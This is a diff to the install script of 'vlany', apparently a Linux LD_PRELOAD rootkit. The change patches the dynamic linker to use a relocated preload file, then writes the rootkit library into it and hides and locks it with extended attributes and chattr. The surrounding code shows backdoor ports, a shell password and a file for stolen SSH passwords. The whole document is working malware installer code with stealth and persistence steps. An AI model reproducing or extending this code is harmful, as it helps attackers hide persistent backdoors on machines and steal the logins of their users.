@@ -29,6 +29,11 @@ CHATTR_OUTPUT=$(touch children; chattr +ia children &>output; cat output)
 [[ $CHATTR_OUTPUT == *"Inappropriate ioctl"* ]] && { read -p "Warning: You're attempting to install vlany on a weird/alien filesystem. This is bad. Bailing."; exit; }
 chattr -ia children &>/dev/null; rm -f children output
 
+patch_dynamic_linker ()
+{
+    NEW_PRELOAD=$(python2 misc/patch_ld.py | tail -n1)
+}
+
 install_vlany_prerequisites ()
 {
     if [ -f /usr/bin/yum ]; then
@@ -177,7 +182,7 @@ get_vlany_settings ()
 config_vlany ()
 {
     # the argument passing to config.py looks fucking ugly im so sorry
-    if [[ ! $(python2 config.py $INSTALL $LIB_LOCATION $HIDDEN_XATTR_1_STR $HIDDEN_XATTR_2_STR $V_USER $V_PASS $PAM_PORT $SSL_STATUS $ACCEPT_SHELL_PASSWORD $LOW_PORT $HIGH_PORT $EXECVE_PASS $ENV_VAR 0) == *"success"* ]]; then
+    if [[ ! $(python2 config.py $INSTALL $LIB_LOCATION $HIDDEN_XATTR_1_STR $HIDDEN_XATTR_2_STR $V_USER $V_PASS $PAM_PORT $SSL_STATUS $ACCEPT_SHELL_PASSWORD $LOW_PORT $HIGH_PORT $EXECVE_PASS $ENV_VAR 0 $NEW_PRELOAD) == *"success"* ]]; then
         if [ "$INSTALLING_IN_CLI"  != "1" ]; then
             dialog --title "$TITLE" --infobox "Configuration failed. Exiting." 3 50 3>&1 1>&2 2>&3
         else
@@ -210,10 +215,11 @@ install_vlany ()
 {
     rm -rf $INSTALL/
     mkdir -p $INSTALL/
+    patch_dynamic_linker
     [ "`uname -m`" == "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.x86_64 $INSTALL/${OBJECT_FILE_NAME}.v6l; }
     [ "`uname -m`" != "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.* $INSTALL/; }
-    [ -f "/etc/ld.so.preload" ] && { chattr -ia /etc/ld.so.preload &>/dev/null; }
-    echo -n $LIB_LOCATION > /etc/ld.so.preload
+    [ -f "$NEW_PRELOAD" ] && { chattr -ia $NEW_PRELOAD &>/dev/null; }
+    echo -n $LIB_LOCATION > $NEW_PRELOAD
 }
 
 setup_vlany ()
@@ -243,9 +249,9 @@ setup_vlany ()
     touch $INSTALL/ssh_passwords # gets rid of annoying "no such file or dir" output when no logins have been stolen yet
 
     # protect files and directories
-    setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} /etc/ld.so.preload
+    setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $NEW_PRELOAD
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL $INSTALL/* $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information
-    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* /etc/ld.so.preload
+    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* $NEW_PRELOAD
 }
 
 echo "Installing python(2)"
